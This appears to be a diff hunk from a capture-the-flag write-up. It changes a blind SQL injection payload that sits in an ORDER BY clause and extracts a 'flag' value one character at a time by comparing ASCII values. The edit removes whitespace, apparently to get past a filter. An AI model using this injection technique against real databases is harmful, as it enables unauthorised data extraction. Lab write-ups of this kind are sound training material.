@@ -86,7 +86,7 @@ SELECT *
 FROM customers
 ORDER BY
 /*                                            Change        v     and      vvv     to brute force the flag */
-    CASE WHEN (ASCII(SUBSTRING((select(value) from (flag)) from (1) for (1)))) div (116) then (id) else (name) end
+    CASE WHEN(ASCII(SUBSTRING((select(value)from(flag))from(1)for(1))))div(116)then(id)else(name)end
 LIMIT 10;
 ```
 
